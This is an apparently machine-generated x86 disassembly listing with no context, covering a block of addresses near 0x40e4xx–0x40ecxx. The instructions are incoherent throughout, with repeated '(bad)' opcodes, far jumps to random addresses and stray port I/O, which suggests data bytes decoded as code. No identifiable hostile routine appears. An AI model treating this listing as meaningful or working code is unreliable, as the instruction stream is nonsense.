  40e495:	les    eax,FWORD PTR [edi-0x2d]
  40e498:	mov    ch,0x28
  40e49a:	mov    edi,ebp
  40e49c:	inc    ecx
  40e49d:	cmc    
  40e49e:	dec    eax
  40e49f:	inc    ecx
  40e4a0:	mov    ch,0x68
  40e4a2:	scas   al,BYTE PTR es:[edi]
  40e4a3:	int3   
  40e4a4:	sti    
  40e4a5:	pop    edx
  40e4a6:	daa    
  40e4a7:	inc    eax
  40e4a8:	jmp    0x40e513
  40e4aa:	pop    ss
  40e4ab:	fild   WORD PTR [esi-0x111bb306]
  40e4b1:	xchg   ebx,eax
  40e4b2:	gs icebp 
  40e4b4:	add    eax,0x64b6ec14
  40e4b9:	bound  edx,QWORD PTR [eax-0x5c]
  40e4bc:	or     al,0x5e
  40e4be:	xchg   DWORD PTR [edi],ebp
  40e4c0:	fmul   st,st(5)
  40e4c2:	test   DWORD PTR [ebp-0x3b50602a],ebp
  40e4c8:	mov    ds,WORD PTR [ebp+0x2c]
  40e4cb:	adc    BYTE PTR [eax],0x77
  40e4ce:	jmp    0x728a:0x5b89704b
  40e4d5:	add    al,0xdc
  40e4d7:	mov    edx,0x90b5e2d9
  40e4dc:	stc    
  40e4dd:	retf   0x22ce
  40e4e0:	jno    0x40e557
  40e4e2:	adc    ah,al
  40e4e4:	gs push eax
  40e4e6:	dec    esp
  40e4e7:	push   edx
  40e4e8:	loop   0x40e4a2
  40e4ea:	shr    BYTE PTR [ebp+0x23],0x43
  40e4ee:	push   esp
  40e4ef:	(bad)  
  40e4f1:	int    0xc8
  40e4f3:	and    al,0x6b
  40e4f5:	jmp    0x78a5931f
  40e4fa:	sub    DWORD PTR [ebx-0x36385480],eax
  40e500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e501:	cwde   
  40e502:	cwde   
  40e503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e504:	data16 mov al,ds:0x2141d44e
  40e50a:	xor    DWORD PTR [edx-0x44c15a69],edi
  40e510:	enter  0xf598,0xb2
  40e514:	(bad)  
  40e515:	cmp    DWORD PTR [ecx-0x7],esp
  40e518:	jne    0x40e522
  40e51a:	cli    
  40e51b:	mov    ch,0x3d
  40e51d:	pop    ss
  40e51e:	sbb    cl,dl
  40e520:	sbb    DWORD PTR [edi-0x24edca0],esi
  40e526:	(bad)  [ebp+0x438529e7]
  40e52c:	pop    ecx
  40e52d:	mov    ds:0xef9d3ff,al
  40e532:	jg     0x40e508
  40e534:	out    0xcb,eax
  40e536:	ss jle 0x40e54b
  40e539:	pop    ss
  40e53a:	mov    ah,0xa7
  40e53c:	dec    esi
  40e53d:	or     DWORD PTR [ecx-0x7d1cb136],ebx
  40e543:	ins    DWORD PTR es:[edi],dx
  40e544:	sub    eax,0xf5f6245
  40e549:	in     al,0xe9
  40e54b:	inc    ecx
  40e54c:	xor    al,0xb7
  40e54e:	mov    ah,0x97
  40e550:	dec    esi
  40e551:	pop    ecx
  40e552:	mov    eax,0xb1b45572
  40e557:	in     eax,dx
  40e558:	xor    BYTE PTR [edx+0x6a3ed7b],dh
  40e55e:	or     ebp,DWORD PTR [ebp-0x8]
  40e561:	retf   0x4c46
  40e564:	iret   
  40e565:	xchg   ecx,eax
  40e566:	mov    ?,WORD PTR [esi-0x3c425cbe]
  40e56c:	sub    eax,0xa67d8aa9
  40e571:	push   ds
  40e572:	mov    WORD PTR cs:[ecx],ss
  40e575:	inc    ecx
  40e576:	(bad)  
  40e577:	sub    eax,0x885f475e
  40e57c:	cld    
  40e57d:	xlat   BYTE PTR ds:[ebx]
  40e57e:	ins    BYTE PTR es:[edi],dx
  40e57f:	aad    0xcd
  40e581:	mov    ecx,?
  40e583:	cmp    eax,0x2675fffe
  40e588:	mov    DWORD PTR [ecx],esp
  40e58a:	jl     0x40e53d
  40e58c:	jmp    0x82d7340d
  40e591:	fs addr16 mov eax,0xac355fa6
  40e598:	jmp    edx
  40e59a:	push   cs
  40e59b:	out    0xf2,al
  40e59d:	shr    BYTE PTR [ebp+0x73],0x35
  40e5a1:	cld    
  40e5a2:	cli    
  40e5a3:	mov    cl,BYTE PTR [eax]
  40e5a5:	xchg   ebp,eax
  40e5a6:	adc    BYTE PTR [ebx],cl
  40e5a8:	les    esi,FWORD PTR [edi]
  40e5aa:	in     al,dx
  40e5ab:	sbb    eax,0x4d80de60
  40e5b0:	cmp    cl,cl
  40e5b2:	neg    DWORD PTR [esi+0x49]
  40e5b5:	dec    eax
  40e5b6:	imul   ecx,eax,0xdb9a3885
  40e5bc:	shl    DWORD PTR [ebx+0x6a7efa63],0x15
  40e5c3:	mov    dl,BYTE PTR [edi+0x4d]
  40e5c6:	sbb    esi,DWORD PTR [ecx-0x3d65a120]
  40e5cc:	test   eax,0x6efdb620
  40e5d1:	adc    BYTE PTR [ebx+0x1c],al
  40e5d4:	fcomp  QWORD PTR [ecx+0x2c14432e]
  40e5da:	adc    al,0x13
  40e5dc:	into   
  40e5dd:	cwde   
  40e5de:	xchg   esi,eax
  40e5df:	mov    al,0xc3
  40e5e1:	cdq    
  40e5e2:	or     ch,bl
  40e5e4:	push   ss
  40e5e5:	xchg   ebx,eax
  40e5e6:	fwait
  40e5e7:	nop
  40e5e8:	loopne 0x40e63f
  40e5ea:	lea    ecx,[ebx+ecx*4]
  40e5ed:	add    DWORD PTR [ebx],edi
  40e5ef:	pop    DWORD PTR [esi+0x60]
  40e5f2:	dec    edi
  40e5f3:	jb     0x40e5f2
  40e5f5:	scas   al,BYTE PTR es:[edi]
  40e5f6:	mov    ecx,0xd078befc
  40e5fb:	ss sahf 
  40e5fd:	inc    ebx
  40e5fe:	dec    ecx
  40e5ff:	inc    ebp
  40e600:	pushw  es
  40e602:	inc    ebx
  40e603:	xor    al,0x75
  40e605:	call   0xa378:0xb67dd0cd
  40e60c:	ins    BYTE PTR es:[edi],dx
  40e60d:	push   esi
  40e60e:	mov    BYTE PTR [edi+0x35dfeb75],bh
  40e614:	rol    DWORD PTR fs:[esi+0x53462d87],cl
  40e61b:	push   eax
  40e61c:	daa    
  40e61d:	jae    0x40e5b3
  40e61f:	shr    eax,0xee
  40e622:	inc    BYTE PTR [edx-0x1c]
  40e625:	mov    ds:0x51d8b916,al
  40e62a:	push   ds
  40e62b:	pop    esp
  40e62c:	mov    eax,ds:0x4bd69049
  40e631:	call   0xbafd23b3
  40e636:	mov    bl,0x65
  40e638:	int    0x3e
  40e63a:	shr    BYTE PTR [eax+0x1e],cl
  40e63d:	ins    DWORD PTR es:[edi],dx
  40e63e:	addr16 xor al,cl
  40e641:	mov    eax,ds:0x802bf1ee
  40e646:	je     0x40e5e4
  40e648:	in     eax,dx
  40e649:	ins    BYTE PTR es:[edi],dx
  40e64a:	xor    esi,DWORD PTR [eax+ebp*4-0x66]
  40e64e:	repz pop ss
  40e650:	repnz fs push edx
  40e653:	mov    ch,0x47
  40e655:	dec    esi
  40e656:	or     dl,BYTE PTR [eax]
  40e658:	ss inc ebx
  40e65a:	mov    esp,0x425d5d44
  40e65f:	mov    ch,0xf8
  40e661:	cdq    
  40e662:	lahf   
  40e663:	dec    esp
  40e664:	pop    eax
  40e665:	xchg   ecx,eax
  40e666:	enter  0x66a,0x78
  40e66a:	test   BYTE PTR [edx],ch
  40e66c:	ja     0x40e656
  40e66e:	push   cs
  40e66f:	gs jo  0x40e606
  40e672:	test   al,0x90
  40e674:	clc    
  40e675:	ds popa 
  40e677:	gs dec eax
  40e679:	loope  0x40e69d
  40e67b:	(bad)  
  40e67d:	scas   eax,DWORD PTR es:[edi]
  40e67e:	cmp    esp,DWORD PTR [ebp-0x4ab2b928]
  40e684:	shl    DWORD PTR [esi-0x4b0d98dc],cl
  40e68a:	(bad)  
  40e68b:	leave  
  40e68c:	pop    ss
  40e68d:	xor    bl,BYTE PTR [eax]
  40e68f:	mov    dl,0x1d
  40e691:	ins    BYTE PTR es:[edi],dx
  40e692:	jns    0x40e6ff
  40e694:	dec    esp
  40e695:	dec    ecx
  40e696:	inc    esi
  40e697:	jno    0x40e70c
  40e699:	scas   eax,DWORD PTR es:[edi]
  40e69a:	les    edx,FWORD PTR [esp+edx*2+0x29]
  40e69e:	pop    eax
  40e69f:	push   edx
  40e6a0:	adc    bl,dl
  40e6a2:	mov    esi,0xb627fc6a
  40e6a7:	scas   al,BYTE PTR es:[edi]
  40e6a8:	mov    ebp,0xb843047a
  40e6ad:	leave  
  40e6ae:	adc    eax,0x2ef17d5c
  40e6b3:	stos   BYTE PTR es:[edi],al
  40e6b4:	inc    esi
  40e6b5:	cmp    DWORD PTR [esi-0x6ed69c69],edi
  40e6bb:	mov    ecx,0x41e1c960
  40e6c0:	mov    BYTE PTR [edx-0x52f2c069],dh
  40e6c6:	ret    
  40e6c7:	sar    DWORD PTR [ecx+0x6a8230e6],1
  40e6cd:	pcmpeqb mm1,QWORD PTR [eax]
  40e6d0:	imul   edx,DWORD PTR [esi+0x1ce8a51e],0x6c
  40e6d7:	jg     0x40e6cd
  40e6d9:	push   ss
  40e6da:	adc    esi,DWORD PTR [ebp-0x1b0d2469]
  40e6e0:	rcr    bl,1
  40e6e2:	sub    ecx,DWORD PTR [edi-0x46]
  40e6e5:	ins    DWORD PTR es:[edi],dx
  40e6e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6e7:	inc    edi
  40e6e8:	outs   dx,BYTE PTR ds:[esi]
  40e6e9:	jb     0x40e762
  40e6eb:	sub    BYTE PTR [esi],cl
  40e6ed:	xchg   BYTE PTR [edx+0x4019581d],ah
  40e6f3:	dec    eax
  40e6f5:	jmp    0x6b9a:0xde2fdd16
  40e6fc:	gs push ebp
  40e6fe:	push   0xffffffd0
  40e700:	or     BYTE PTR [eax],0xa0
  40e703:	data16 out 0xa3,al
  40e706:	mov    BYTE PTR [edx-0x25],dh
  40e709:	add    bl,dl
  40e70b:	jno    0x40e769
  40e70d:	sbb    DWORD PTR [ecx+esi*1-0x69c5cbf3],eax
  40e714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e715:	xor    eax,0xe401a906
  40e71a:	(bad)  
  40e71b:	push   eax
  40e71c:	fsub   QWORD PTR [ecx+edx*8-0x36]
  40e720:	int3   
  40e721:	(bad)  
  40e722:	adc    edx,edx
  40e724:	mov    cl,0xc7
  40e726:	ds fld st(1)
  40e729:	mov    ecx,0x8da8d082
  40e72e:	adc    eax,eax
  40e730:	adc    BYTE PTR [eax+0x44710fc6],cl
  40e736:	pusha  
  40e737:	dec    BYTE PTR [esp+ebx*2+0x40]
  40e73b:	aad    0x45
  40e73d:	aaa    
  40e73e:	iret   
  40e73f:	xchg   edi,ecx
  40e741:	out    dx,al
  40e742:	neg    DWORD PTR [ebp+0x3fd5db88]
  40e748:	fsubr  DWORD PTR [edi+0x3f]
  40e74b:	xor    edi,DWORD PTR [ebp+0x48079ff1]
  40e751:	in     eax,0x17
  40e753:	mov    bh,0x9a
  40e755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e756:	or     eax,0x7cc04250
  40e75b:	and    dl,al
  40e75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75e:	rcl    DWORD PTR [edi-0x15],1
  40e761:	or     eax,0xabc36bf7
  40e766:	cld    
  40e767:	xchg   DWORD PTR [ebx],ebx
  40e769:	add    ebp,edx
  40e76b:	mov    ebp,0x8c646f39
  40e770:	pushf  
  40e771:	mov    edi,0xc97533c
  40e776:	ja     0x40e70d
  40e778:	icebp  
  40e779:	push   ebp
  40e77a:	enter  0x8b7f,0x31
  40e77e:	pop    esi
  40e77f:	pop    ss
  40e780:	mov    dl,0xd8
  40e782:	loopne 0x40e748
  40e784:	sub    eax,0x1346e3ee
  40e789:	jle    0x40e779
  40e78b:	pop    edi
  40e78c:	cmp    dl,dh
  40e78e:	xchg   ebp,eax
  40e78f:	mov    al,0x43
  40e791:	mov    WORD PTR [eax+0x78263d11],?
  40e797:	push   es
  40e798:	mov    dl,0xa6
  40e79a:	cli    
  40e79b:	mov    ch,0x49
  40e79d:	out    dx,eax
  40e79e:	mov    ds:0x32771f53,al
  40e7a3:	xor    al,0x11
  40e7a5:	inc    ebp
  40e7a6:	test   BYTE PTR [edi-0x15],dh
  40e7a9:	sub    ebp,esi
  40e7ab:	xchg   edx,eax
  40e7ac:	sbb    eax,0x29bd5d1c
  40e7b1:	add    bl,bh
  40e7b3:	mov    al,ds:0x2ce1dd61
  40e7b8:	xor    esi,DWORD PTR [ecx-0x16]
  40e7bb:	scas   eax,DWORD PTR es:[edi]
  40e7bc:	push   esi
  40e7bd:	pop    edi
  40e7be:	sbb    ebp,DWORD PTR ds:0x3f4b9576
  40e7c4:	call   0xac7094f4
  40e7c9:	push   0x1b
  40e7cb:	push   ebp
  40e7cc:	stos   BYTE PTR es:[edi],al
  40e7cd:	mov    edi,0x83e09a62
  40e7d2:	push   ecx
  40e7d3:	std    
  40e7d4:	(bad)  
  40e7d5:	xchg   ebx,eax
  40e7d6:	in     eax,0x37
  40e7d8:	idiv   DWORD PTR [esp+ebx*2-0x50adcdf3]
  40e7df:	call   0x89b0def
  40e7e4:	call   0x6d4359ee
  40e7e9:	sbb    cl,BYTE PTR [ecx]
  40e7eb:	fcmovne st,st(0)
  40e7ed:	pop    esp
  40e7ef:	sub    dl,bh
  40e7f1:	pop    ebp
  40e7f2:	mov    bh,0x7b
  40e7f4:	add    edx,0x1445244e
  40e7fa:	add    dh,dl
  40e7fc:	std    
  40e7fd:	and    eax,0xfbbf7fc7
  40e802:	push   ss
  40e803:	push   edx
  40e804:	add    bl,ch
  40e806:	test   dl,dl
  40e808:	sahf   
  40e809:	lds    eax,FWORD PTR [edi+0xcbdd7ef]
  40e80f:	dec    esp
  40e810:	cwde   
  40e811:	cmp    BYTE PTR ds:0x883a8979,dh
  40e817:	jge    0x40e7e7
  40e819:	loope  0x40e840
  40e81b:	or     cl,BYTE PTR [edx]
  40e81d:	jl     0x40e834
  40e81f:	in     eax,dx
  40e820:	imul   eax,DWORD PTR [edx],0xa0319466
  40e826:	push   ss
  40e827:	ins    BYTE PTR es:[edi],dx
  40e828:	sbb    ecx,esp
  40e82a:	stc    
  40e82b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e82c:	and    eax,0x9e75ece9
  40e831:	xor    eax,DWORD PTR [esi+edi*2+0x39ed713]
  40e838:	mov    ebx,0x60b7e959
  40e83d:	cmp    BYTE PTR [ebp+edi*2-0x7a],bh
  40e841:	call   0x5bdd:0x70d202cc
  40e848:	mov    esi,0xa0c89ddd
  40e84d:	sub    bh,dh
  40e84f:	mov    eax,0x9e6599dc
  40e854:	mov    edi,0x7f56ec4f
  40e859:	test   eax,0x71d03c6d
  40e85e:	in     eax,dx
  40e85f:	inc    esp
  40e860:	mov    bh,0x9c
  40e862:	mov    edi,DWORD PTR [ebp+eax*8+0x2]
  40e866:	mov    dh,0xe2
  40e868:	stos   BYTE PTR es:[edi],al
  40e869:	inc    esp
  40e86a:	addr16 cwde 
  40e86c:	sbb    al,0x2f
  40e86e:	popf   
  40e86f:	or     eax,0x1506f290
  40e874:	call   0xe68a:0x48f05439
  40e87b:	into   
  40e87c:	add    DWORD PTR [esi-0x13],0x77946e88
  40e883:	xchg   esi,eax
  40e884:	push   ss
  40e885:	mov    ebx,0xf86cfb6b
  40e88a:	or     BYTE PTR [ebx+edi*8],bh
  40e88d:	or     DWORD PTR [ebp-0x8],ebp
  40e890:	sub    ch,dl
  40e892:	idiv   DWORD PTR [ebx]
  40e894:	adc    esi,ebp
  40e896:	sbb    DWORD PTR [edx+0x2e],0xf2b57de
  40e89d:	test   al,0x96
  40e89f:	test   DWORD PTR [esi-0x5c],eax
  40e8a2:	or     eax,esp
  40e8a4:	adc    DWORD PTR [edx+0x37],0xa2392d22
  40e8ab:	(bad)  
  40e8ad:	outs   dx,DWORD PTR ds:[esi]
  40e8ae:	outs   dx,BYTE PTR ds:[esi]
  40e8af:	push   esi
  40e8b0:	ins    BYTE PTR es:[edi],dx
  40e8b1:	or     eax,0x6d5d05f6
  40e8b6:	rol    BYTE PTR [eax-0x51bc9669],cl
  40e8bc:	mov    ebp,0xec9ae03c
  40e8c1:	push   ds
  40e8c2:	adc    eax,DWORD PTR [esi-0x46e16738]
  40e8c8:	fild   DWORD PTR [ebp-0x72626d9a]
  40e8ce:	retf   
  40e8cf:	(bad)  
  40e8d1:	sbb    al,0x6d
  40e8d3:	fst    DWORD PTR [edx]
  40e8d5:	cld    
  40e8d6:	std    
  40e8d7:	loop   0x40e92f
  40e8d9:	push   0xffffff90
  40e8db:	cmc    
  40e8dc:	or     dh,BYTE PTR [edx+esi*2-0x7271534b]
  40e8e3:	test   BYTE PTR [ecx+0x21],dh
  40e8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8e7:	pop    edx
  40e8e8:	lods   al,BYTE PTR ds:[esi]
  40e8e9:	pop    esp
  40e8ea:	inc    esp
  40e8eb:	jp     0x40e920
  40e8ed:	sbb    esi,esp
  40e8ef:	mov    WORD PTR [eax-0x54bab32e],ds
  40e8f5:	pop    edi
  40e8f6:	dec    ebp
  40e8f7:	in     al,dx
  40e8f8:	inc    edx
  40e8f9:	int3   
  40e8fa:	dec    ecx
  40e8fb:	std    
  40e8fc:	and    ah,dh
  40e8fe:	shr    BYTE PTR [ecx-0x75],1
  40e901:	ret    0x865f
  40e904:	inc    ecx
  40e905:	jge    0x40e912
  40e907:	jae    0x40e88c
  40e909:	test   eax,0xabdbabe0
  40e90e:	dec    edx
  40e90f:	jecxz  0x40e926
  40e911:	or     eax,0xb4f9d99f
  40e916:	lods   eax,DWORD PTR ds:[esi]
  40e917:	bnd jl 0x40e8ae
  40e91a:	daa    
  40e91b:	and    eax,0xc21bf751
  40e920:	pop    eax
  40e921:	and    dl,BYTE PTR [edx+0x5d]
  40e924:	mov    al,ds:0x31ecd3ac
  40e929:	(bad)  
  40e92a:	out    dx,al
  40e92b:	jl     0x40e906
  40e92d:	dec    edi
  40e92e:	clc    
  40e92f:	nop
  40e930:	add    eax,0xd96517cb
  40e935:	bound  esi,QWORD PTR [edx+0x69]
  40e938:	shl    BYTE PTR [eax+ebp*1],0x31
  40e93c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e93d:	sbb    dh,cl
  40e93f:	lahf   
  40e940:	in     al,dx
  40e941:	inc    edi
  40e942:	fidivr DWORD PTR [eax+0x67919da6]
  40e948:	out    dx,al
  40e949:	xor    eax,0xad6a64ef
  40e94e:	sub    bh,BYTE PTR [eax+esi*2]
  40e951:	dec    ebx
  40e952:	shr    DWORD PTR [ebp-0x2],1
  40e955:	mov    dh,0xbe
  40e957:	inc    edx
  40e958:	xchg   esi,eax
  40e959:	dec    ecx
  40e95a:	int    0xe5
  40e95c:	jne    0x40e96c
  40e95e:	into   
  40e95f:	daa    
  40e960:	iret   
  40e961:	inc    edi
  40e962:	cs rcl eax,0xb5
  40e966:	adc    DWORD PTR [edi-0x6e],0xffffffcd
  40e96a:	dec    esp
  40e96b:	cmp    eax,0xde4a05ea
  40e970:	(bad)  
  40e972:	inc    BYTE PTR [esi]
  40e974:	imul   ebx,DWORD PTR [edx],0xffffff84
  40e977:	addr16 enter 0xe99e,0xab
  40e97c:	adc    edx,ebp
  40e97e:	pop    ds
  40e97f:	mov    ebp,0xc05dbe18
  40e984:	mov    ah,0x8
  40e986:	imul   esp,edx,0xe57a5155
  40e98c:	dec    eax
  40e98d:	mov    ecx,0x8813a180
  40e992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e993:	jg     0x40e978
  40e995:	cdq    
  40e996:	in     al,dx
  40e997:	and    BYTE PTR [ebx+0x32],dl
  40e99a:	inc    esp
  40e99b:	xchg   edi,eax
  40e99c:	sbb    DWORD PTR [ebx+0x69],esp
  40e99f:	and    BYTE PTR ds:0xcdba7fdd,bl
  40e9a5:	pop    ecx
  40e9a6:	ds addr16 in eax,dx
  40e9a9:	sbb    eax,0x2e3144e3
  40e9ae:	aas    
  40e9af:	sbb    DWORD PTR [edx-0xb8a0ebe],0xffffff8b
  40e9b6:	xchg   DWORD PTR [ecx-0x657b56ae],ebx
  40e9bc:	mov    al,0xb
  40e9be:	mov    edi,ebp
  40e9c0:	mov    ebp,0x6a04c353
  40e9c5:	xor    al,BYTE PTR fs:[edx]
  40e9c8:	(bad)  
  40e9ca:	mov    bh,0xb
  40e9cc:	out    dx,al
  40e9cd:	(bad)  
  40e9ce:	cmp    al,0xa0
  40e9d0:	and    eax,0x2b9429ed
  40e9d5:	sbb    ebx,DWORD PTR [edi-0x55]
  40e9d8:	in     eax,0x42
  40e9da:	lods   eax,DWORD PTR ds:[esi]
  40e9db:	cmp    dl,BYTE PTR [ebp-0x500a5b10]
  40e9e1:	in     al,0xfa
  40e9e3:	cmp    dh,BYTE PTR [ecx-0x16]
  40e9e6:	stc    
  40e9e7:	mov    ds:0x96bfb89b,eax
  40e9ec:	mov    edi,0x2ad2c60a
  40e9f1:	sub    ecx,DWORD PTR [edi-0x19]
  40e9f4:	test   al,0x70
  40e9f6:	repnz shl DWORD PTR [edx],1
  40e9f9:	in     eax,0x6a
  40e9fb:	sbb    ebx,DWORD PTR [edi-0x10c8231c]
  40ea01:	mov    eax,0x1f14622c
  40ea06:	test   eax,0x67950d2e
  40ea0b:	sahf   
  40ea0c:	arpl   WORD PTR [esi+0x22af806f],si
  40ea12:	mov    BYTE PTR [ecx-0x68b1191],dh
  40ea18:	fstp   QWORD PTR [eax-0x2e423a46]
  40ea1e:	xchg   edx,esi
  40ea20:	add    al,0x40
  40ea22:	inc    esi
  40ea24:	mov    ch,0x0
  40ea26:	rcr    bl,1
  40ea28:	lahf   
  40ea29:	jg     0x40e9fa
  40ea2b:	or     DWORD PTR [eax+0x5],edx
  40ea2e:	push   esi
  40ea2f:	sahf   
  40ea30:	inc    ecx
  40ea31:	and    al,0x4
  40ea33:	scas   eax,DWORD PTR es:[edi]
  40ea34:	pop    es
  40ea35:	xor    al,0x8
  40ea37:	mov    dh,0x7
  40ea39:	aam    0x2d
  40ea3b:	cs or  al,0x1a
  40ea3e:	cwde   
  40ea3f:	shl    dl,0x4e
  40ea42:	jo     0x40ea38
  40ea44:	(bad)  
  40ea45:	and    DWORD PTR [eax],ebp
  40ea47:	sti    
  40ea48:	test   DWORD PTR [esi-0x76ab262c],0x9f8fe1a7
  40ea52:	or     esi,ebp
  40ea54:	lahf   
  40ea55:	ror    DWORD PTR [ebp-0x39e98ae8],cl
  40ea5b:	rcl    ebx,cl
  40ea5d:	add    al,0x48
  40ea5f:	jbe    0x40ea53
  40ea61:	jp     0x40ea29
  40ea63:	inc    ecx
  40ea64:	push   es
  40ea65:	add    al,0x24
  40ea67:	xlat   BYTE PTR ds:[ebx]
  40ea68:	daa    
  40ea69:	rol    BYTE PTR [edx+esi*8+0x5225f403],cl
  40ea70:	mov    cl,0x6
  40ea72:	imul   edi,ecx,0x15
  40ea75:	int    0xa4
  40ea77:	inc    edi
  40ea78:	mov    DWORD PTR ds:0xe8a3b68e,edi
  40ea7e:	lahf   
  40ea7f:	(bad)  
  40ea80:	mov    dh,0x6b
  40ea82:	mov    edi,0x1e863e4a
  40ea87:	scas   al,BYTE PTR es:[edi]
  40ea88:	mov    ah,0xea
  40ea8a:	sar    DWORD PTR [eax],1
  40ea8c:	pop    ss
  40ea8d:	int    0x27
  40ea8f:	dec    ebp
  40ea90:	mov    eax,0xd755bb8e
  40ea95:	daa    
  40ea96:	sub    DWORD PTR [esi-0x78e48e05],esp
  40ea9c:	mov    BYTE PTR [ebp+0x7b],ch
  40ea9f:	pushf  
  40eaa0:	das    
  40eaa1:	cmp    eax,0xbffd8ed4
  40eaa6:	inc    edi
  40eaa7:	aas    
  40eaa8:	adc    bh,0x9f
  40eaab:	adc    al,0xd2
  40eaad:	fwait
  40eaae:	sub    ecx,DWORD PTR [eax+0x0]
  40eab1:	dec    ebp
  40eab2:	bound  eax,QWORD PTR [esi+0x61]
  40eab5:	push   edx
  40eab6:	cmp    al,0x20
  40eab8:	jge    0x40eb19
  40eaba:	xchg   ebx,eax
  40eabb:	sti    
  40eabc:	adc    DWORD PTR [edx-0x4],ecx
  40eabf:	arpl   WORD PTR [ebp+0x37],ax
  40eac2:	add    BYTE PTR [ebx-0xc4b9758],ch
  40eac8:	fwait
  40eac9:	out    0x20,al
  40eacb:	or     ch,BYTE PTR [esi-0x78]
  40eace:	add    ebp,esp
  40ead0:	sahf   
  40ead1:	mov    BYTE PTR [eax-0x3],ch
  40ead4:	xchg   esp,eax
  40ead5:	adc    BYTE PTR [edi],al
  40ead7:	sub    DWORD PTR [eax],0x0
  40eada:	lock jecxz 0x40ead6
  40eadd:	ret    
  40eade:	add    DWORD PTR [ecx+0x48],ebp
  40eae1:	pop    esi
  40eae2:	or     dh,BYTE PTR [ecx]
  40eae4:	jbe    0x40eb2a
  40eae6:	ins    BYTE PTR es:[edi],dx
  40eae7:	fwait
  40eae8:	inc    ebp
  40eae9:	jp     0x40eb52
  40eaeb:	push   ebx
  40eaec:	shl    DWORD PTR ds:[eax-0x1f],1
  40eaf0:	neg    DWORD PTR [esi+0x12]
  40eaf3:	je     0x40eab6
  40eaf5:	popf   
  40eaf6:	pusha  
  40eaf7:	xor    eax,0x21d6899a
  40eafc:	nop
  40eafd:	push   esi
  40eafe:	sub    eax,0x5d43d574
  40eb03:	xchg   edx,eax
  40eb04:	lahf   
  40eb05:	and    cl,BYTE PTR [edi-0x36dfea6f]
  40eb0b:	out    dx,al
  40eb0c:	aas    
  40eb0d:	ja     0x40eaf6
  40eb0f:	stos   BYTE PTR es:[edi],al
  40eb10:	(bad)  
  40eb11:	push   0xd5a3023
  40eb16:	rol    DWORD PTR [ebx],1
  40eb18:	jl     0x40eab6
  40eb1a:	hlt    
  40eb1b:	mov    ds:0x2fc16796,eax
  40eb20:	repz ja 0x40eb7c
  40eb23:	jmp    0x6059:0x1134999e
  40eb2a:	(bad)
  40eb2d:	jmp    0xf689:0x5c5b5a0b
  40eb34:	(bad)  
  40eb35:	pop    esp
  40eb36:	rcr    esp,1
  40eb38:	mov    BYTE PTR [ebx],ch
  40eb3a:	mov    ch,0x3c
  40eb3c:	adc    eax,0x8c2ba0ad
  40eb41:	cld    
  40eb42:	xchg   edi,eax
  40eb43:	fst    st(4)
  40eb45:	addr16 mov bh,0x4a
  40eb48:	out    0x8c,eax
  40eb4a:	mov    WORD PTR [ebp+0x3d],cs
  40eb4d:	mov    eax,ds:0x2681c2a4
  40eb52:	cmp    eax,0xd71e3118
  40eb57:	leave  
  40eb58:	mov    ds:0xd9191cc3,eax
  40eb5d:	popf   
  40eb5e:	dec    esp
  40eb5f:	data16 imul BYTE PTR [esi+edx*1+0x116f266c]
  40eb67:	jmp    0x3cd5:0x14ddc4b9
  40eb6e:	adc    BYTE PTR [ebx+0xd],ah
  40eb71:	fs out 0x34,eax
  40eb74:	mov    DWORD PTR [ecx],ecx
  40eb76:	xor    ebp,DWORD PTR [esi-0x7c4436df]
  40eb7c:	stos   BYTE PTR es:[edi],al
  40eb7d:	pop    eax
  40eb7e:	dec    ebp
  40eb7f:	mov    eax,ds:0x7d846859
  40eb84:	xor    eax,0x13d9aae2
  40eb89:	jnp    0x40ebc7
  40eb8b:	iret   
  40eb8c:	pop    ecx
  40eb8d:	cli    
  40eb8e:	or     eax,0x9ed55a91
  40eb93:	pop    ss
  40eb94:	xchg   ebp,eax
  40eb95:	cmp    DWORD PTR ds:0xd4489aa0,eax
  40eb9b:	in     al,dx
  40eb9c:	pop    eax
  40eb9d:	xchg   esp,eax
  40eb9e:	xor    dh,BYTE PTR [edx+0x68122f9f]
  40eba4:	sbb    BYTE PTR [ebx+0x3a],ch
  40eba7:	inc    edx
  40eba8:	and    eax,0x8fb87183
  40ebad:	aas    
  40ebae:	xor    BYTE PTR [edx],dl
  40ebb0:	loopne 0x40ec0c
  40ebb2:	xor    BYTE PTR [edi+0x2d3bb62a],dl
  40ebb8:	xor    ebp,ecx
  40ebba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebbb:	call   0x6125:0x5b282c41
  40ebc2:	fsub   QWORD PTR [ebx]
  40ebc4:	inc    DWORD PTR [edx+0x76]
  40ebc7:	sbb    edi,edx
  40ebc9:	fld    DWORD PTR [ebx+edi*8-0x6e]
  40ebcd:	pushw  0x1a79
  40ebd1:	pop    edx
  40ebd2:	mov    ah,0x71
  40ebd4:	jmp    0x485b5980
  40ebd9:	rcl    BYTE PTR [ebx+edi*4],1
  40ebdc:	jmp    0x40ec24
  40ebde:	aaa    
  40ebdf:	icebp  
  40ebe0:	pop    ds
  40ebe1:	test   BYTE PTR [edi],cl
  40ebe3:	mov    ecx,0xa62d2d61
  40ebe8:	sbb    DWORD PTR [edi],ebp
  40ebea:	(bad)  
  40ebeb:	outs   dx,BYTE PTR ds:[esi]
  40ebec:	loope  0x40ebed
  40ebee:	pusha  
  40ebef:	pop    es
  40ebf0:	out    0x38,eax
  40ebf2:	sahf   
  40ebf3:	mov    edi,0xe7f6e9ab
  40ebf8:	add    al,BYTE PTR [esi+ebx*1]
  40ebfb:	add    eax,ecx
  40ebfd:	loopne 0x40ec3c
  40ebff:	pop    esi
  40ec00:	mov    dh,0x9e
  40ec02:	xor    ebx,ebp
  40ec04:	add    DWORD PTR [ebp-0xece9db7],esi
  40ec0a:	push   0x0
  40ec0c:	ficom  WORD PTR [ecx-0x7d45e133]
  40ec12:	push   esp
  40ec13:	leave  
  40ec14:	loopne 0x40ec91
  40ec16:	xor    al,0x19
  40ec18:	call   0xe0d1:0xa196205f
  40ec1f:	xor    al,BYTE PTR [esi]
